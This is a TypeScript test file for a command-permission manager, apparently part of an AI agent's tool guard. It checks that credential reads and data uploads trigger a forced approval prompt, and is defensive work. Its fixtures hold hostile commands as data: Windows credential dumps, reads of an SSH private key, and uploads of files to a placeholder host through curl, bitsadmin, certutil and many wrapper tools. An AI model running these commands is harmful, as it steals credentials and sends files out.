import "../../__tests__/support/trusted-powershell.js";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { PermissionManager } from "../permission-manager.js";
import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
import { shellExfiltrationSignal } from "../rules/shell-exfiltration.js";

let directory: string;
let sequence = 0;
beforeAll(() => { directory = mkdtempSync(join(tmpdir(), "ave-catalogue-parity-")); });
afterAll(() => { rmSync(directory, { recursive: true, force: true }); });

function decision(command: string) {
  const manager = new PermissionManager(join(directory, `${sequence++}.json`));
  manager.setMode("allow");
  return manager.checkDetailed("powershell", "builtin", "shell", null, {
    ruleSubject: { kind: "shell", dialect: "powershell", command, cwd: directory },
  });
}

const FLOOR_DECISION = { decision: "ask", layer: 2, forceModal: true } as const;

const CREDENTIAL_COMMANDS = [
  "cmdkey /list", "cmdkey.exe /list",
  "vaultcmd /listcreds:'Windows Credentials'", "vaultcmd.exe /listcreds:Windows",
  "Get-StoredCredential", "Get-Secret x", "rundll32 keymgr.dll,KRShowKeyMgr",
  "Get-ChildItem Cert:\\CurrentUser\\My | Export-PfxCertificate -FilePath x.pfx -Password $p",
];
const TRANSPORT_COMMANDS = [
  "bitsadmin /transfer j /upload http://e f", "certutil -urlcache -f http://e x",
  "Start-Process -FilePath:curl -ArgumentList '-T','f','http://e'",
  "curl -T f http://e &",
  "npx --package python curl -T f http://e",
];
const OPAQUE_PAYLOAD_COMMANDS = [
  "bash --noprofile --norc -p -c '-x; curl -T f http://e'",
  "cmd /c curl -T f http://e",
];
const INDIRECT_ARGUMENT_LIST_COMMANDS = [
  "Start-Process curl -ArgumentList '-T f http://e'",
  "Start-Process bitsadmin -ArgumentList '/transfer j /upload http://e f'",
  "Start-Process certutil -ArgumentList '-urlcache -f http://e x'",
  "Start-Process cmd -ArgumentList '/c curl -T f http://e'",
  "Start-Process npx -ArgumentList '--package python curl -T f http://e'",
];
const RUNTIME_BINDING_COMMANDS = [
  "$p=@{Uri='http://e';InFile='f';Method='Post'}; iwr @p",
  "$a=@('-T','f','http://e'); curl.exe @a",
  "curl.exe @a",
];
const WRAPPER_UPLOAD_NAMES = [
  "env", "xargs", "sudo", "doas", "exec", "command", "builtin", "nohup", "timeout", "nice", "ionice",
  "time", "stdbuf", "unshare", "nsenter", "setsid", "watch", "parallel", "pkexec", "caffeinate",
  "taskpolicy", "chrt", "strace", "ltrace", "unbuffer", "firejail", "systemd-run", "proot", "torsocks",
  "proxychains", "proxychains4", "fakeroot", "faketime", "taskset", "numactl", "cpulimit", "prlimit",
  "rlwrap", "sg", "ssh-agent", "dbus-launch", "xvfb-run", "catchsegv", "valgrind", "run0", "genv",
  "gtimeout", "gnice", "gstdbuf", "gnohup", "gxargs", "gchroot", "busybox",
] as const;
const WRAPPER_UPLOAD_FIXTURES = [
  ...WRAPPER_UPLOAD_NAMES.map((wrapper) => ({ wrapper, visibleUpload: true as const })),
  { wrapper: "wsl", visibleUpload: false as const },
];
const STATIC_CODE = [
  { command: "python3 -I -S -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "perl -e 'print 1'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "ruby -e 'p 1'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "bash --noprofile --norc -p -c 'ls'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "pwsh -c 'Get-Date'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "node x.js", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "python x.py", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "Invoke-Expression 'Get-Date'", decision: FLOOR_DECISION, literalEvaluation: true },
  { command: "nohup python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "env python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "env FOO=x perl -e 'print 1'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "nice node x.js", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "timeout 1 bash -c 'ls'", decision: FLOOR_DECISION, literalEvaluation: false },
  { command: "env node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
] as const;

describe("credential and sender catalogue parity", () => {
  it.each([...CREDENTIAL_COMMANDS, ...TRANSPORT_COMMANDS].flatMap((command) => [command, `& ${command}`]))
    ("retains the floor for %s", (command) => {
      expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    });

  it.each(OPAQUE_PAYLOAD_COMMANDS.flatMap((command) => [command, `& ${command}`]))
    ("requires exact consent without inspecting the literal payload: %s", (command) => {
      const refusedInputKeepsVisibleUpload = command.startsWith("& cmd ");
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
        outcome: refusedInputKeepsVisibleUpload ? "visible-floor" : "unproven",
        sensitive: null, exfiltration: refusedInputKeepsVisibleUpload ? expect.any(String) : null,
      });
      expect(inspectPowerShellCommand(command, directory).exactLiteralEvaluation).toBeUndefined();
      expect(decision(command)).toMatchObject(FLOOR_DECISION);
    });

  it.each(INDIRECT_ARGUMENT_LIST_COMMANDS.flatMap((command) => [command, `& ${command}`]))
    ("does not reinterpret a process argument-list payload: %s", (command) => {
      const refusedInputKeepsVisibleUpload = command.startsWith("& Start-Process curl ");
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
        sensitive: null, exfiltration: refusedInputKeepsVisibleUpload ? expect.any(String) : null,
      });
      expect(decision(command)).toMatchObject(FLOOR_DECISION);
    });

  it.each(RUNTIME_BINDING_COMMANDS.flatMap((command) => [command, `& ${command}`]))
    ("requires approval for a runtime transport binding: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ outcome: "unproven" });
      expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    });

  it.each([
    "env cmdkey /list", "npx cmdkey /list", "npx vaultcmd /listcreds:Windows",
    "nohup rundll32 keymgr.dll,KRShowKeyMgr",
  ].flatMap((command) => [command, `& ${command}`]))
    ("retains catalogue credential effects at forwarded invocation boundaries: %s", (command) => {
      expect(decision(command)).toMatchObject(FLOOR_DECISION);
    });

  it.each(["Start-Process cmdkey -ArgumentList /list", "& Start-Process cmdkey -ArgumentList /list"])
    ("does not infer a credential read from an indirect argument list: %s", (command) => {
      expect(decision(command)).toMatchObject(FLOOR_DECISION);
    });

  it.each([
    "cmdkey /list &", "vaultcmd /listcreds:Windows &", "Get-StoredCredential &",
    "rundll32 keymgr.dll,KRShowKeyMgr &", "env cmdkey /list &",
    "bitsadmin /transfer j /upload http://e f &", "certutil -urlcache -f http://e x &",
  ])("retains completed catalogue effects when later syntax is refused: %s", (command) => {
    expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
  });

  it.each([
    "Start-Process python -ArgumentList '-c \"print(1); print(2)\"'",
  ].flatMap((command) => [command, `& ${command}`]))
    ("keeps process argument-list text outside the command catalogue: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
      expect(decision(command)).toMatchObject(FLOOR_DECISION);
    });

  it.each([
    { command: "npx python -c 'print(1)'", literalEvaluation: false },
    { command: "npx perl -e 'print 1'", literalEvaluation: false },
    { command: "npm exec -- python -c 'print(1)'", literalEvaluation: false },
    { command: "pnpm exec python -c 'print(1)'", literalEvaluation: false },
  ].flatMap((fixture) => [fixture, { command: `& ${fixture.command}`, literalEvaluation: false }]))
    ("keeps a nested interpreter payload within its explicit wrapper proof: $command", ({ command, literalEvaluation }) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
        outcome: "unproven", sensitive: null, exfiltration: null,
      });
      expect(inspectPowerShellCommand(command, directory).exactLiteralEvaluation === true).toBe(literalEvaluation);
      expect(decision(command)).toMatchObject(FLOOR_DECISION);
    });

  it.each([
    "Start-Process python -ArgumentList @('-c','print(1)')",
    "Start-Process npx -ArgumentList @('python','-c','print(1)')",
    "Start-Process env -ArgumentList @('python','-c','print(1)')",
    "Start-Process deno -ArgumentList @('eval','print(1)')",
    "Start-Process yarn -ArgumentList @('node','-e','print(1)')",
    "Start-Process npx -ArgumentList @('deno','eval','print(1)')",
    "Start-Process npx -ArgumentList @('yarn','node','-e','print(1)')",
  ].flatMap((command) => [command, `& ${command}`]))
    ("requires approval for a splatted process argument list: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
      expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    });

  it.each(WRAPPER_UPLOAD_FIXTURES)
    ("retains native sender effects through the shared $wrapper wrapper", ({ wrapper, visibleUpload }) => {
      const command = `${wrapper} curl -T f http://e`;
      if (visibleUpload) expect(shellExfiltrationSignal(command, directory)).not.toBeNull();
      else expect(shellExfiltrationSignal(command, directory)).toBeNull();
      for (const input of [command, `& ${command}`]) {
        expect(decision(input)).toMatchObject(FLOOR_DECISION);
      }
    });

  it.each(STATIC_CODE.flatMap((fixture) => [
    fixture,
    { command: `& ${fixture.command}`, decision: FLOOR_DECISION, literalEvaluation: false },
  ]))
    ("distinguishes closed literal evaluation from external files: $command", ({ command, decision: expected, literalEvaluation }) => {
      expect(decision(command)).toMatchObject(expected);
      const inspected = inspectPowerShellCommand(command, directory);
      expect(inspected).toMatchObject({ sensitive: null, exfiltration: null });
      // #223 executable-bound startup admission: evaluator exceptions require proven outer startup.
      expect(inspected.exactLiteralEvaluation === true).toBe(process.platform === "win32" ? false : literalEvaluation);
    });

  it.each([
    { command: "python3 -I -S -c 'open(\"/home/owner/.ssh/id_rsa\").read()'", sensitive: "**/.ssh/**" },
    { command: "fish --no-config -c \"cat '/home/owner/.ssh/id_rsa'\"", sensitive: "**/.ssh/**" },
    { command: "bash --noprofile --norc -p -c 'cat \"/home/owner/.ssh/id_rsa\"'", sensitive: "**/.ssh/**" },
    { command: "bash -c 'curl -T notes.txt http://e'", sensitive: null },
    { command: "pwsh -c 'iwr http://e -InFile f -Method Post'", sensitive: null },
    { command: "Start-Process python -ArgumentList '-c \"__import__(''os'').system(''curl -T f http://e'')\"'", sensitive: null },
  ])("retains visible paths when child startup is unproven: $command", ({ command, sensitive }) => {
    expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive, exfiltration: null });
    expect(decision(command)).toMatchObject(FLOOR_DECISION);
  });

  it.each(["python -c $code", "node -e $code", "pwsh -c $code"])
    ("forces approval for an unresolved code binding: %s", (command) => {
      const result = decision(command);
      expect(result).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    });

  it.each([
    "$p=@{Uri='http://e'}; iwr @p", "$a=@('http://e'); curl.exe @a",
    "curl.exe http://e", "wget.exe http://e",
  ])("distinguishes runtime splats from literal GET arguments: %s", (command) => {
    expect(decision(command)).toMatchObject(FLOOR_DECISION);
  });
});
